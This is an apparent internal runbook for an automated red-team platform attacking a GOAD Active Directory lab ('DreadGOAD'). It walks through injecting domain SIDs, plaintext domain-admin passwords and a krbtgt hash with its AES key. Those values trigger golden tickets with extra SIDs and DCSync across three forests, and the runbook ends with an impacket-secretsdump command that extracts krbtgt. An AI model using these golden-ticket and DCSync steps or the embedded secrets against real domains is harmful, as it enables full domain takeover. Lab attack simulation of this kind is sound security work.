# Manual Multi-Forest End-to-End: DreadGOAD

What it actually takes to get all three forests dominated, step by step.

## Why Manual Steps Are Needed

The automated chain handles `north.sevenkingdoms.local` → `sevenkingdoms.local`
escalation well, but **essos.local requires manual intervention** because:

1. **Impacket cross-realm Kerberos is broken** (`KDC_ERR_WRONG_REALM` in
   v0.13.0.dev0+20251022) — inter-realm TGTs cannot be exchanged for service
   tickets on the target KDC. This blocks the trust-key-based attack path.
2. **PTH with source-domain Admin has no DCSync rights on foreign forest** —
   `sevenkingdoms.local\Administrator` cannot replicate `essos.local`.
3. **Agents rarely discover essos.local DA credentials naturally** in test
   timeframes — MSSQL exploitation on braavos times out, password spray hasn't
   been finding `daenerys.targaryen`.

## Prerequisites

```bash
# Sync code and restart all pods
task -y red:multi:sync:align TEAM=all

# Start operation
task -y red:multi TARGET=dreadgoad

# Get operation ID
OP_ID=$(task red:multi:list 2>/dev/null | grep '\[running\]' | tail -1 | awk '{print $1}')
echo "Operation: $OP_ID"
```

Wait ~30s for agents to discover hosts, then proceed.

## Step 1: Set DC Mappings

The `domain_controllers` Redis hash must be populated. Agents discover hosts but
don't always map domain→DC IP correctly (winterfell reports as
`sevenkingdoms.local` in banners, not `north.sevenkingdoms.local`).

```bash
ORCH_POD=$(kubectl get pods -n attack-simulation | grep "^ares-orchestrator" | awk '{print $1}')

kubectl exec -n attack-simulation $ORCH_POD -- python3 -c "
import redis, os
pw = os.environ['REDIS_PASSWORD']
r = redis.Redis(host='redis-0.redis-headless.attack-simulation.svc.cluster.local',
                port=6379, password=pw, decode_responses=True)
key = 'ares:op:${OP_ID}:domain_controllers'
r.hset(key, 'north.sevenkingdoms.local', '10.1.2.121')
r.hset(key, 'sevenkingdoms.local', '10.1.2.238')
r.hset(key, 'essos.local', '10.1.2.211')
print('DC map:', dict(r.hgetall(key)))
"
```

## Step 2: Inject Domain SIDs

Golden ticket and cross-forest attacks need domain SIDs. These are normally
extracted from secretsdump output, but we inject them to skip the lookupsid
step (which often fails with `STATUS_NETLOGON_NOT_STARTED` in GOAD).

```bash
task red:multi:inject-domain-sid OPERATION_ID=$OP_ID \
  DOMAIN=north.sevenkingdoms.local \
  SID=S-1-5-21-1328384573-4090356449-2552632942

task red:multi:inject-domain-sid OPERATION_ID=$OP_ID \
  DOMAIN=sevenkingdoms.local \
  SID=S-1-5-21-2541677866-1628385213-2562505918

task red:multi:inject-domain-sid OPERATION_ID=$OP_ID \
  DOMAIN=essos.local \
  SID=S-1-5-21-1606295247-3362563358-1415986617
```

## Step 3: Inject Credentials

These simulate what agents would discover via password spray, kerberoasting,
MSSQL exploitation, etc.

```bash
# Child domain DA (eddard.stark is DA on north.sevenkingdoms.local)
task red:multi:inject-credential OPERATION_ID=$OP_ID \
  USERNAME=eddard.stark PASSWORD='FightP3aceAndHonor!' \  # pragma: allowlist secret
  DOMAIN=north.sevenkingdoms.local

# Parent domain DA (cersei.lannister is DA on sevenkingdoms.local)
# Used by credential fallback when golden ticket DCSync fails
task red:multi:inject-credential OPERATION_ID=$OP_ID \
  USERNAME=cersei.lannister PASSWORD='il0vejaime' \  # pragma: allowlist secret
  DOMAIN=sevenkingdoms.local

# CRITICAL: essos.local DA — this is the one agents don't find naturally
task red:multi:inject-credential OPERATION_ID=$OP_ID \
  USERNAME=daenerys.targaryen PASSWORD='BurnThemAll!' \  # pragma: allowlist secret
  DOMAIN=essos.local
```

## Step 4: Inject krbtgt Hash (Triggers the Chain)

This is the domino that starts the automated chain. The AES256 key is required
because Windows Server 2016+ DCs reject RC4 golden tickets with
`KDC_ERR_TGT_REVOKED`.

```bash
task red:multi:inject-hash OPERATION_ID=$OP_ID \
  USERNAME=krbtgt DOMAIN=north.sevenkingdoms.local \
  HASH="aad3b435b51404eeaad3b435b51404ee:faaa7e195adfc629437d6e9135712b5d" \
  AES_KEY="fc0a616dc66a009191d790779ca0d5abb7e125bc3a6fb3621e491ef91f991bfa"  # pragma: allowlist secret
```

## What Happens Automatically After Injection

The orchestrator's `_auto_golden_ticket` loop (runs every 30s) detects the
krbtgt hash and executes this chain:

```text
1. north.sevenkingdoms.local krbtgt + AES256
   → Golden ticket with ExtraSid (Enterprise Admin SID for parent)
   → DCSync child DC for SEVENKINGDOMS$ trust hash

2. If golden ticket DCSync fails (KDC_ERR_TGT_REVOKED with bad AES):
   → Credential fallback: uses cersei.lannister to DCSync parent DC
   → Extracts Administrator, krbtgt, ESSOS$ trust hash from parent

3. Cross-forest attack on essos.local:
   → Inter-realm TGT with ESSOS$ trust key → KDC_ERR_WRONG_REALM (fails)
   → PTH fallback with sevenkingdoms.local\Administrator → ACCESS_DENIED (fails)
   → Target-domain credential DCSync with daenerys.targaryen → SUCCESS

4. essos.local\krbtgt + Administrator extracted
   → all_forests_dominated() = True
   → Operation marked complete
```

## Step 5: Monitor Progress

```bash
# Watch for golden ticket and cross-forest events
kubectl logs -f -n attack-simulation $(kubectl get pods -n attack-simulation \
  | grep "^ares-orchestrator" | awk '{print $1}') 2>/dev/null \
  | grep -E "🎫|🌲|FOREST DOMINATED|all_forests_dominated|operation.*complete"

# Check loot (refreshes every 5s)
task red:multi:loot LATEST=true WATCH=5

# Verify completion
task red:multi:list LATEST=true
```

Expected output when complete:

```text
*** MULTI-FOREST COMPROMISE ***
  Forests compromised: essos.local, sevenkingdoms.local
*** DOMAIN ADMIN ACHIEVED ***
  Compromised domains: essos.local, north.sevenkingdoms.local, sevenkingdoms.local
```

## Timing

From injection to completion: **~3-5 minutes** (mostly waiting for secretsdump
commands to run on worker pods).

| Phase | Duration | Bottleneck |
| ------- | ---------- | ---------- |
| Golden ticket generation | ~5s | ticketer command |
| Child DC DCSync (trust hash) | ~60-180s | secretsdump over VPN |
| Parent DC DCSync (fallback) | ~60-180s | secretsdump over VPN |
| Cross-forest inter-realm | ~5s | fails immediately |
| Target-domain credential DCSync | ~30-60s | secretsdump over VPN |

## Obtaining Real Values

If you need to get the actual krbtgt hash and AES key from the GOAD lab
(values above are for the current DreadGOAD deployment):

```bash
# From any worker pod with network access to winterfell (10.1.2.121):
kubectl exec -it -n attack-simulation ares-privesc-agent-0 -- bash

# DCSync krbtgt from north.sevenkingdoms.local
impacket-secretsdump 'north.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!@10.1.2.121' \
  -just-dc-user 'krbtgt' 2>&1

# Output will contain:
#   krbtgt:502:aad3b435b51404ee...:faaa7e195adfc629...:::
#   krbtgt:aes256-cts-hmac-sha1-96:fc0a616dc66a009191d790779...
```

## Known Issues

- **winterfell hostname**: nmap/LDAP reports `Domain: sevenkingdoms.local`
  (forest root) instead of `north.sevenkingdoms.local`. Code handles this but
  it can confuse DC candidate selection.
- **Credential fallback ordering**: If a non-DA credential is injected before a
  DA credential for the same domain, the non-DA may be picked first. Fixed in
  latest code (prefers `administrator`/`admin` usernames, then `is_admin=True`).
- **`_cross_forest_attempted` dedup**: Previously blocked retries even when no
  credentials were available for PTH. Fixed — now only marks attempted when
  credentials were actually used.
- **impacket KDC_ERR_WRONG_REALM**: Fundamental bug in impacket's cross-realm
  Kerberos. No fix available. All inter-realm TGT approaches fail.
